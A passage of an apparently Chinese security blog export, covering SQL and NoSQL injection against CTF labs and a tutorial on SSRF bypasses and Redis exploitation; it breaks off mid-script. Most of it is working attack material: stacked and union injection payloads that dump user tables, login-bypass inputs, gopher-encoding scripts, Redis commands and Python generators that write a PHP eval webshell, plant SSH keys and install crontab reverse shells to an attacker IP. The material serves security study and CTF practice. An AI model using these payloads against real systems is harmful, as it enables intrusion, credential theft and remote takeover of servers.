`words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) ;show columns from words;#\n\n此时再利用万能语句，即可得到flag\n1' or 1=1 #\n这里还有一种方法，就是采用预编译的方法\nset是设置一个新列\nprepare是进行定义一个语句\nexecute是执行\n构造payload如下\n-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#\n执行结果这里用strstr函数过滤了set和prepare关键词，但strstr这个函数并不能区分大小写，我们将其大写即可\n-1';sEt @sql = CONCAT('se','lect * from `1919810931114514`;');prEpare stmt from @sql;EXECUTE stmt;#\n执行结果\n0X03//师傅说过滤的越多越好\nif(preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username))&#123;\n  die(json_encode($ret));\n&#125;\n\n发现可以进行堆叠注入，show未被ban，因此可用show来获取表名列名，payload如下\nadmin';show tables;#\nadmin';show columns from `ctfshow_flagasa`;#\n\n有如下两种方法获取flag\n预编译\nadmin';prepare quan9i from concat('selec','t * from `ctfshow_flagasa`');execute quan9i;#\nhandle不熟悉可以看这篇文章https://blog.51cto.com/u_15023289/2559944，我们在这里所使用其的中心思想就是HANDLER … OPEN 语句打开一个表，后续的 HANDLER … READ 语句可以访问它。此表对象不被其他会话共享，并且直到调用 HANDLER … CLOSE 或者会话终止才会关闭。\nhandler ctfshow_flagasa open;handler ctfshow_flagasa read first;\n二次注入进入界面后如下图所示发现下方有注册的，我们点击注册，用弱口令admin来尝试，命名为admin’#，密码设置为111，如下图此时查询数据库，发现注册的已经插入数据库中我们登录看看，如下图发现是更改密码的，我们试着将111改123，此时查看数据库发现更改了admin的密码，即说明注入成功那他到底能有什么作用呢，我们可以通过一段php代码来体现它的作用\n&lt;?php\ninclude(\"../sql-connections/sql-connect.php\");#引用数据库连接文件\nerror_reporting(0);//关闭报错\n$sql=\"SELECT * FROM users ORDER BY id\";//sql语句是拿出所有数据按照id排列，即从id=1直至最后\n$result=mysql_query($sql); //此函数指的是仅执行一种语句，为了防止多个语句注入，并将结果赋值给新变量\n$num=mysql_num_rows($result);//此函数指返回结果集中行的数目，新变量$num就是这个数\nfor ($i=0; $i &lt; $num; ++$i) &#123; //for 循环语句,起始时变量i为0，设置条件为变量i小于变量num，即运行到变量num-1，每次执行后变量加一继续执行\n$row = mysql_fetch_array($result);//取出变量result作为一组关联数组赋值给新变量row\n$username = $row[1];//将变量row的第一列赋值给变量username\n$sql_detail = \"SELECT * FROM users where username='$username'\"; //将变量username用单引号包裹\n$result_detail=mysql_query($sql_detail);//仅执行一种语句，将结果赋值给新变量$result_detail\n$num_detail = mysql_num_rows($result_detail);//计算变量$result_detail的行数赋值给新$num_detail\nfor ($j=0; $j &lt; $num_detail; ++$j) &#123; //for 循环语句，，起始时j为0，设置条件为j小于变量$num_detail，每次执行后加一继续执行\n$row_detail = mysql_fetch_array($result_detail);//将结果以关联数组形式联合起来，赋值给新变量\necho&lt;&lt;&lt;END\n&lt;table border=\"1\" style=\"table-layout:fixed;\" width=\"1000\">\n&lt;tr>\n&lt;th>$row_detail[1]&lt;/th>\n&lt;th>$row_detail[2]&lt;/th>\n&lt;/tr>\n&lt;/table>\nEND;\n&#125;\n&#125;\n?>\n执行结果为用户名和密码被打印出来了！\n宽字节注入0X01当我们输入?id=1&#39;时，发现多了一个反斜线，此时我们考虑到宽字节注入，尝试去构造一个字母与后面的\\组成汉字，我们知道%df与\\可以组成汉字運，构造payload如下\n?id=1%df%27\n注：%27是单引号的url编码\n执行结果�\\ 实际上就是那个運字 ，此时我们就可以尝试进行注入爆库\n?id=-1%df%27 union select 1,2,database()%23\n执行结果爆表\n?id=-1%df%27 union select 1,2,\n(select group_concat(table_name) from information_schema.tables\n where table_schema=database())--+\n注:此时库名不能写&#39;security&#39;，因为出现了单引号，可以用database()或十六进制来进行代替爆列名\n?id=-1%df%27 union select 1,2,\n(select group_concat(column_name) from information_schema.columns \nwhere table_name=0x7573657273)--+\n执行结果\n爆字段信息（下方以uesrs为例）\n?id=-1%df%27 union select 1,2,\n(select group_concat(username,0x7e,password) from security.users)--+\n执行结果\n0X02进入靶场后下方灰色处发现可以点击，点击进入尝试宽字节注入\n?id=1%df'\n发现报错，说明可以进行宽字节注入那就开始日常的sql注入流程，判断字段数\n?id=1%df' order by 6 --+\n执行结果说明字段数为5，此时利用联合查询，看哪个有回显\n?id=-1%df' union select 1,2,3,4,5 --+\n发现3和5有回显位，此时利用3和5来爆库并得到当前用户名\n?id=-1%df' union select 1,2,user(),4,database() --+\nmozhe_discuz_stormgroup此时再查表名\n?id=-1%df' union select 1,2,user(),4,(select group_concat(table_name) from\n information_schema.tables where \n table_schema=0x6d6f7a68655f64697363757a5f73746f726d67726f7570) --+\n同时查两个表的列名\n?id=-1%df' union select 1,2,(select group_concat(column_name) from\ninformation_schema.columns where table_name=0x73746f726d67726f75705f6d656d626572),4,\n(select group_concat(column_name) from information_schema.columns where \ntable_name=0x6e6f74696365) --+\n此时想到我们登录需要的是name和password，因此我们查询这两个字段\n?id=-1%df' union select 1,2,(select group_concat(column_name) from\n information_schema.columns where table_name=0x73746f726d67726f75705f6d656d626572),4,\n (select group_concat(name,0x7e,password,0x7e,status) from \n mozhe_discuz_stormgroup.stormgroup_member)--+\n得到uesrname是mozhe，此时用password对后面状态为1的进行md5解密得到密码，进行登录获取到了key，解题完成\nlimit注入 //分页查询\n  $sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;\n返回逻辑 \n//TODO:很安全，不需要过滤\n//拿到数据库名字就算你赢\n构造payload如下\n?page=1&amp;limit=0%20 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1);\n\nmd5注入$username = $_POST['username'];\n$password = md5($_POST['password'],true);\n\n本关username声明必须为admin才能得到flag，再观察password，被md5函数包裹了我们构造payload如下即可\nusername: admin\t\npassword: ffifdyop\n\n那此时语句就相当于是\n$sql = \"select count(*) from ctfshow_user where username = 'admin' and password= ''or '6+其他字符'\";\n执行结果\nnosql注入0X01  //无\n  $user = $memcache->get($id);\n      \n返回逻辑\n  //无过滤\nmemcache是返回数组的，此时按理说传?id=flag就可以，不过报错了，学习其他师傅的wp后说后端进行了intval检测,这个函数吧，他是检测数字的，本地测试如下因此我们需要构造一个数组形式，也就是?id[]=flag，当然二维数组的名字可以随便写，?id[12345]=flag也行，因为最终传入的数据是flag\n0X02观察语句并分析代码，发现传入的是变量data，而data中的数据是username和password，因此我们想实现成功获取flag，可以利用永真式，构造payload如下(ne是非的意思，具体见上方)\nusername[$ne]=1&amp;password[$ne]=1\n此时执行的实际语句就是\n&#123;\n    'username': &#123;\n        '$ne': '1'\n    &#125;,\n    'password': &#123;\n        '$ne': '1'\n    &#125;\n&#125;\n0X03//sql语句\n  $query = new MongoDB\\Driver\\Query($data);\n  $cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();\n //返回逻辑，无过滤\n  if(count($cursor)>0)&#123;\n    $ret['msg']='登陆成功';\n    array_push($ret['data'], $flag);\n  &#125;  \n\n这关你利用和上关同样的姿态，会发现有admin和admin1两个用户名 方法一此时看似无法使用永真式注入了，但是其实你仔细观察后会发现password一致，因此我们可以更改password对应的内容，构造payload如下即可\nusername[$ne]=1&amp;password[$ne]=ctfshow666nnneeaaabbbcc\n方法二正常这关的话利用的是正则匹配,因为flag的用户名可能是f开头，所以构造payload如下\nusername[$regex]=f.*&amp;password[$ne]=1\n也可以让它匹配非a开头的，构造payload如下\nusername[$regex]=^[^admin].*$&amp;password[$ne]=1\n\n^[^admin].*$的话这个就随便作为字符，因为*是全部\n\n这个payload需要熟悉一下正则表达式的部分知识\n^的作用\n1、限定开头\n^匹配后面紧跟的字符为开头的字符（[ ]之外或数字、元字符之前），如^[0-9]，含义为以0-9中的数字为第一个数字开头。\n2、取反:\n当这个字符出现在一个字符集合模式（[ ]之内）的第一个字符时，表示为取反。如[^0-9]，表示为匹配除了数字以外的字符。\n$的作用\n表示从字符串末尾进行匹配。\n如/^[0-9]&#123;8&#125;$/，表示为字符串以数字为结尾字符。\n","slug":"浅析sql注入漏洞","date":"2022-07-04T13:31:20.000Z","categories_index":"WEB知识","tags_index":"SQL注入","author_index":"quan9i"},{"id":"5fdc9b0e6b2ac7fe212943a2f6d06f72","title":"从一文中了解SSRF的各种绕过姿势及攻击思路","content":"声明文章首发于跳跳糖社区https://tttang.com/archive/1648/\n前言SSRF之前只有简单了解，进行二次学习后简单总结一下，希望能对正在学习SSRF的师傅们有所帮助\n漏洞相关信息漏洞成因SSRF 形成的原因往往是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。\n如：从指定URL地址获取网页文本内容，加载指定地址的图片，下载等。利用的就是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。\n漏洞定义SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）\n漏洞危害1、读取或更新内部资源，造成本地文件泄露；\n2、将含有漏洞防主机用作代理/跳板攻击内网主机，绕过防火墙等；\n3、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner 信息\n4、对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)\n5、攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)\n所涉函数curl_exec()curl_exec()  curl_exec函数用于执行指定的cURL会话。\n举个栗子，代码如下\n&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$url=$_POST['url'];\n//初始化curl会话\n$ch=curl_init($url); \n// 设置URL和相应的选项\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);\n//// 抓取URL并把它传递给浏览器\n$result=curl_exec($ch);\n //关闭cURL资源，并且释放系统资源\ncurl_close($ch);\necho ($result);\n?>\n这个时候我们就可以利用url参数，来获取内网的部分文件，直接写127.0.0.1:/flag.php这种即可，赋值给URL\nfile_get_contents()file_get_contents() file_get_content函数从用户指定的url获取内容，然后指定一个文件名\n进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。\n对于file_get_contents() 函数，它是可以获取文件内容的，我们这里也简单举个栗子来介绍其利用方式\n&lt;?php\n$url = $_GET['url'];;\necho file_get_contents($url);\n?>\n此时就存在一种漏洞，就是可以直接读取内网的文件\nfsockopen()fsockopen()  fsockopen — 打开一个网络连接或者一个Unix套接字连接\n\n&lt;?php\n$host=$_GET['url'];\n$fp = fsockopen(\"$host\",80, $errno, $errstr,30);\nif(!$fp)&#123;\necho \"$errstr ($errno)&lt;br />\\n\";\n&#125;else&#123;\n$out =\"GET / HTTP/1.1\\r\\n\";\n$out .=\"Host: $host\\r\\n\";\n$out .=\"Connection: Close\\r\\n\\r\\n\";\nfwrite($fp, $out);\nwhile(!feof($fp))&#123;\necho fgets($fp,1024);\n&#125;\nfclose($fp);\n&#125;\n?>\nfsockopen函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限,传输原始数据。\n所涉协议file伪协议file:// — 访问本地文件系统\n简单的说呢，就是探测本地的文件，比较官方的解释及用法如下\nfile:// 协议：\n        条件 allow_url_fopen:off/on  allow_url_include :off/on\n        作用：用于访问本地文件系统。在include()/require()等参数可控的情况下\n             如果导入非php文件也会被解析为php\n        用法：\n            1.file://[文件的绝对路径和文件名]\n            2.[文件的相对路径和文件名]\n            3.[http：//网络路径和文件名]\n\n以简单题作为栗子来实践一下\n题目描述\n尝试去读取一下Web目录下的flag.php吧\n进入环境，一片空白，发现url参数，利用file伪协议尝试读取flag\nurl=file:///var/www/html/flag.php\n\nGopher协议当探测内网或执行命令时需要发送 POST 请求，我们可以利用 gopher 协议协议格式：gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;，这里的gopher-path就相当于是发送的请求数据包\n这个以ctfhub的一道小题来讲解打开环境没有发现什么东西，扫一下扫描后发现有个文件名字是flag.php文件，此时我们去访问这个文件提示只能用本机来访问，此时我们构造如下payload\nurl=http://127.0.0.1/flag.php\n发现是文件上传此时查看一下文件源码\nurl=file:///var/www/html/flag.php\n源码如下\n\n&lt;?php\n\nerror_reporting(0);\n\nif($_SERVER[\"REMOTE_ADDR\"] != \"127.0.0.1\")&#123;\n    echo \"Just View From 127.0.0.1\";\n    return;\n&#125;\n\nif(isset($_FILES[\"file\"]) &amp;&amp; $_FILES[\"file\"][\"size\"] > 0)&#123;\n    echo getenv(\"CTFHUB\");\n    exit;\n&#125;\n?>\n\nUpload Webshell\n\n&lt;form action=\"/flag.php\" method=\"post\" enctype=\"multipart/form-data\">\n    &lt;input type=\"file\" name=\"file\">\n&lt;/form>\n此时发现确实是文件上传，只要文件大于0就可以成功上传，此时我们去尝试上传个文件，不过此时发现没有提交按钮….，无伤大雅，我们可以自己编辑前端代码创建一个提交按钮，构造代码如下\n&lt;input type=\"submit\" name=\"submit\">\n\n然后随便上传个文件上去此时修改host为127.0.0.1，就构造出了我们需要的post数据包，再运用如下脚本进行二次编码即可\nimport urllib.parse\npayload =\\\n\"\"\"POST /flag.php HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: multipart/form-data; boundary=---------------------------224170729831654278414248977569\nContent-Length: 525\nOrigin: http://challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com:10800\nConnection: close\nReferer: http://challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com:10800/?url=http://127.0.0.1/flag.php\nUpgrade-Insecure-Requests: 1\n\n-----------------------------224170729831654278414248977569\nContent-Disposition: form-data; name=\"file\"; filename=\"1.txt\"\nContent-Type: application/octet-stream\n-----------------------------224170729831654278414248977569\nContent-Disposition: form-data; name=\"submit\"\n\n123\n-----------------------------224170729831654278414248977569--\n123\n-----------------------------224170729831654278414248977569\nContent-Disposition: form-data; name=\"submit\"\n\n123\n-----------------------------224170729831654278414248977569--\n\"\"\"\n\n#注意后面一定要有回车，回车结尾表示http请求结束\ntmp = urllib.parse.quote(payload)\nnew = tmp.replace('%0A','%0D%0A')\nresult = 'gopher://127.0.0.1:80/'+'_'+new\nresult = urllib.parse.quote(result)\nprint(result)       # 这里因为是GET请求所以要进行两次url编码\n执行脚本后得到转码后的代码如下\ngopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A98.0%2529%2520Gecko/20100101%2520Firefox/98.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------224170729831654278414248977569%250D%250AContent-Length%253A%2520525%250D%250AOrigin%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.txt%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A123%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A  \n此时直接赋值给url参数即可\nurl=gopher%3A//127.0.0.1%3A80/_POST%2520/flag.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%250D%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%253B%2520rv%253A98.0%2529%2520Gecko/20100101%2520Firefox/98.0%250D%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/avif%252Cimage/webp%252C%252A/%252A%253Bq%253D0.8%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.8%252Czh-TW%253Bq%253D0.7%252Czh-HK%253Bq%253D0.5%252Cen-US%253Bq%253D0.3%252Cen%253Bq%253D0.2%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AContent-Type%253A%2520multipart/form-data%253B%2520boundary%253D---------------------------224170729831654278414248977569%250D%250AContent-Length%253A%2520525%250D%250AOrigin%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800%250D%250AConnection%253A%2520close%250D%250AReferer%253A%2520http%253A//challenge-fbeb7e53e47ecd22.sandbox.ctfhub.com%253A10800/%253Furl%253Dhttp%253A//127.0.0.1/flag.php%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250A%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.txt%2522%250D%250AContent-Type%253A%2520application/octet-stream%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A123%250D%250A-----------------------------224170729831654278414248977569%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522submit%2522%250D%250A%250D%250A123%250D%250A-----------------------------224170729831654278414248977569--%250D%250A  \n\ndict协议ict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，能用来探测端口的指纹信息协议格式：dict://&lt;host&gt;:&lt;port&gt;/&lt;dict-path&gt;一般用dict://&lt;host&gt;:&lt;port&gt;/info 探测端口应用信息\n举个栗子\ndict://127.0.0.1:6379 //探测redis是否存活\ndict://127.0.0.1:6379/info //探测端口应用信息\n\n\nRESP协议RESP 协议是 redis 服务之间数据传输的通信协议，redis 客户端和 redis 服务端之间通信会采取 RESP 协议因此我们后续构造 payload 时也需要转换成 RESP 协议的格式\n*1\n$8\nflushall\n*3\n$3\nset\n$1\n1\n$64\n\n*/1 * * * * bash -i >&amp; /dev/tcp/192.168.230.132/1234 0>&amp;1\n\n*4\n$6\nconfig\n$3\nset\n$3\ndir\n$16\n/var/spool/cron/\n*4\n$6\nconfig\n$3\nset\n$10\ndbfilename\n$4\nroot\n*1\n$4\nsave\nquit\n其中\n*n代表着一条命令的开始，n 表示该条命令由 n 个字符串组成\n$n代表着该字符串有 n 个字符\n执行成功后服务器会返回 +OK，这个是 redis 服务器对 redis 客户端的响应\n常见绕过姿势URL and IP PASS当遇见过滤localhost和127.0.0.1时，此时是无法直接进行访问内网的，那我们此时该怎么办呢，有以下几种绕过方式\n302跳转网络上存在一个名为sudo.cc的服务，放访问这个服务时，会自动重定向到127.0.0.1\n添加@绕过平常我们传入的url是url=http://127.0.0.1，如果我们传入的url是url=http://quan9i@127.0.0.1,它此时依旧会访问127.0.0.1\n示例如下题目给出提示要求必须以http://notfound.ctfhub.com开头，但我们访问内网文件的话，有这个，该怎么访问呢，这个时候就用到了@字符，我们构造payload如下\nurl=http://notfound.ctfhub.com@127.0.0.1/flag.php\n\n特殊数字（例如②）有时候可以用特殊数字来绕过，构造特殊的127.0.0.1，如1②7.0.0.1\n句号替代.绕过用。来代替.\n省略0当过滤127.0.0.1整体时，还有一种绕过方式就是省略中间的0，这个时候也是可以访问的\n进制转换将127.0.0.1进行转换，转换为其他进制的数从而绕过检测进制转换结果如下\n0177.0.0.1 //八进制\n0x7f.0.0.1 //十六进制\n2130706433 //十进制\n也可以利用php转换脚本来直接得到结果，脚本如下\n&lt;?php\n$ip = '127.0.0.1';\n$ip = explode('.',$ip);\n$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;\nif($r &lt; 0) &#123;\n$r += 4294967296;\n&#125;\necho \"十进制:\";\necho $r;\necho \"八进制:\";\necho decoct($r);\necho \"十六进制:\";\necho dechex($r);\n?>\n\n特殊0在windows中，0代表0.0.0.0，而在linux下，0代表127.0.0.1，如下所示\nurl=http://0/flag.php\n\nDNS重绑定DNS是Domain Name Service的缩写,计算机域名服务器,在Internet上域名与IP地址之间是一一对应的，域名虽然便于人们记忆，但机器之间只能互相认识IP地址，它们之间的转换工作称为域名解析，而域名解析需要由专门的域名解析服务器来完成，这就是DNS域名服务器。\n在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS 重绑定攻击。攻击过程如下\n对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。\n\n但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，我们可以进行DNS 重绑定攻击。我们利用DNS Rebinding技术，在第一次校验IP的时候返回一个合法的IP，在真实发起请求的时候，返回我们真正想要访问的内网IP即可。\n\n要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0，这是为了防止有DNS服务器对解析结果进行缓存。这样就可以进行攻击了，完整的攻击流程为：\n\n服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP\n\n对于获得的IP进行判断，发现为非黑名单IP，则通过验证\n\n服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。\n\nDNS重绑定这里简单的说就是我们先提供一个ip，然后在服务端进行解析的过程中再传127.0.0.1，此时就可能会出现访问到本地文件的情况举个栗子，我们设置一个为127.0.0.1，另一个随便写一下ping这个地址，可以发现有两种情况，一种是1.1.1.14，另一种是127.0.0.1\nDNS重绑定用的是这个网站[https://lock.cmpxchg8b.com/rebinder.html]\nRedis常见攻击姿势绝对路径写webshell前提\n1、redis 有 root\n2、知道网站绝对路径\n靶机开启redis攻击机连接未授权的redis（博主只是小白，可能有部分有问题）\nredis-cli -h ip地址\n\n连接成功，开始写webshell\n1、flushall //命令用于清空整个 Redis 服务器的数据\n2、set 1 '&lt;?php @eval($_POST[1]);?>' //设置内容为一句话木马\n3、config set dir '/var/www/html'  //设置文件存储路径\n4、config set dbfilename shell.php //设置文件名\n5、save //保存\n\n去靶机查看成功写入\n结合SSRF此时是后端服务器向 redis 服务器发起请求，因此发送的内容需要转换成 RESP 协议的格式，通过结合 gopher 协议达到写入 shell 的目的\n通用脚本如下\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.134.132\" //ip地址\nport=\"6379\" //端口\nshell=\"\\n\\n&lt;?php eval($_GET[\\\"cmd\\\"]);?>\\n\\n\"//写入内容为一句话木马\nfilename=\"1.php\" //文件名为1.php\npath=\"/var/www/html\"//默认路径\npasswd=\"\"\ncmd=[\"flushall\",\n     \"set 1 &#123;&#125;\".format(shell.replace(\" \",\"$&#123;IFS&#125;\")),\n     \"config set dir &#123;&#125;\".format(path),\n     \"config set dbfilename &#123;&#125;\".format(filename),\n     \"save\"\n     ]\nif passwd:\n    cmd.insert(0,\"AUTH &#123;&#125;\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n    CRLF=\"\\r\\n\"\n    redis_arr = arr.split(\" \")\n    cmd=\"\"\n    cmd+=\"*\"+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+\"$\"+str(len((x.replace(\"$&#123;IFS&#125;\",\" \"))))+CRLF+x.replace(\"$&#123;IFS&#125;\",\" \")\n    cmd+=CRLF\n    return cmd\n\nif __name__==\"__main__\":\n    for x in cmd:\n        payload += urllib.quote(redis_format(x))\n    print payload\n尝试使用此payload进行攻击查看该目录下成功写入\n写ssh公钥条件\n1、Redis服务使用ROOT账号启动\n2、服务器开放了SSH服务，而且允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器\n在靶机中执行命令ssh-keygen -t rsa，而后一路回车即可此时去找公钥和私钥存放位置\nfind . -name \".ssh\"\n\n查看id_rsa.pub内容\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTcPHlQF54WarRY8IQY7+mKkkQm7hWDSn5rHreuLNtd56bJdY/melINxXeQ2c/xiupBWKoKZSz8RwPx+yz36Zvvpfa/DXUN9MA6CJz4zofjmFbQWImSe3pEFJ2V3XbPPSEOz38bXKRK/akLYL9CI2joGh4mv4iQgSxHF40HKrVyl4/UD40S/ujVtaj1AJUcpTQkm9MW9VuQY110WW0HI1LRXyiAlF9EbLxe7WQY78eASI86gI8gil6UHE0Y6v41JxQJHkf63q6fzcIYBrmfePn8K8PzDIViu+Pf+Tx9dP+YodAZo6ZDbsg06aJG1cYHbnG+qWSoeybDcnxhRj2c5PS9zzjWHNE1eWyP9ILs4P4ZDfy8ZX4i9twWdF8FLhpDpogfcKJJ2f1G4tHKdnrbSGVtZw+QoIVmbGtW8feEKgAW71PEK2wBVacrqfpd7AxslCL8RCqETa8iVnR5shNs4cAHxLhIdmF8mmk5ZBE2On/uoWf3x+FSzicmhV6d8zDFkE= root@kali\n此时去攻击机上连接redis\nflushall\nset 1 'id_rsa.pub内容'\nconfig set dir '/root/.ssh/'\nconfig set dbfilename authorized_keys\nsave\n\n去靶机里查看成功写入此时ssh -root@靶机ip即可成功登录\n结合SSRF脚本如下\nimport urllib\nprotocol=\"gopher://\"\nip=\"192.168.134.132\"\nport=\"6379\"\nfilename=\"authorized_keys\"\nssh_pub=\"\\n\\nssh-rsa  AAAAB3NzaC1yc2EAAAADAQABAAABgQDTcPHlQF54WarRY8IQY7+mKkkQm7hWDSn5rHreuLNtd56bJdY/melINxXeQ2c/xiupBWKoKZSz8RwPx+yz36Zvvpfa/DXUN9MA6CJz4zofjmFbQWImSe3pEFJ2V3XbPPSEOz38bXKRK/akLYL9CI2joGh4mv4iQgSxHF40HKrVyl4/UD40S/ujVtaj1AJUcpTQkm9MW9VuQY110WW0HI1LRXyiAlF9EbLxe7WQY78eASI86gI8gil6UHE0Y6v41JxQJHkf63q6fzcIYBrmfePn8K8PzDIViu+Pf+Tx9dP+YodAZo6ZDbsg06aJG1cYHbnG+qWSoeybDcnxhRj2c5PS9zzjWHNE1eWyP9ILs4P4ZDfy8ZX4i9twWdF8FLhpDpogfcKJJ2f1G4tHKdnrbSGVtZw+QoIVmbGtW8feEKgAW71PEK2wBVacrqfpd7AxslCL8RCqETa8iVnR5shNs4cAHxLhIdmF8mmk5ZBE2On/uoWf3x+FSzicmhV6d8zDFkE= root@kali \\n\\n\"\npath=\"/root/.ssh/\"\npasswd=\"\"\ncmd=[\"flushall\",\n     \"set 1 &#123;&#125;\".format(ssh_pub.replace(\" \",\"$&#123;IFS&#125;\")),\n     \"config set dir &#123;&#125;\".format(path),\n     \"config set dbfilename &#123;&#125;\".format(filename),\n     \"save\"\n     ]\nif passwd:\n    cmd.insert(0,\"AUTH &#123;&#125;\".format(passwd))\npayload=protocol+ip+\":\"+port+\"/_\"\ndef redis_format(arr):\n    CRLF=\"\\r\\n\"\n    redis_arr = arr.split(\" \")\n    cmd=\"\"\n    cmd+=\"*\"+str(len(redis_arr))\n    for x in redis_arr:\n        cmd+=CRLF+\"$\"+str(len((x.replace(\"$&#123;IFS&#125;\",\" \"))))+CRLF+x.replace(\"$&#123;IFS&#125;\",\" \")\n    cmd+=CRLF\n    return cmd\n\nif __name__==\"__main__\":\n    for x in cmd:\n        payload += urllib.quote(redis_format(x))\n    print payload\n运行后得到payload开启靶机环境，去攻击机进行curl + payload\n此时尝试登录\n写contrab计划任务反弹shell条件\nredis 有 root\n环境是centos，由于 redis 输出的文件都是 644 权限，但是 ubuntu 中的定时任务一定要 600 权限才能实现所以这个方法只适用于 centos\n靶机开启redis，攻击连接后执行以下指令\nflushall\nset 1 \"\\n\\n\\n\\n* * * * * root bash -i >&amp; /dev/tcp/192.168.134.132/1234 0>&amp;1\\n\\n\\n\\n\"\nconfig set dir '/var/spool/cron'\nconfig set dbfilename root\nsave\n结合SSRF脚本\nimport 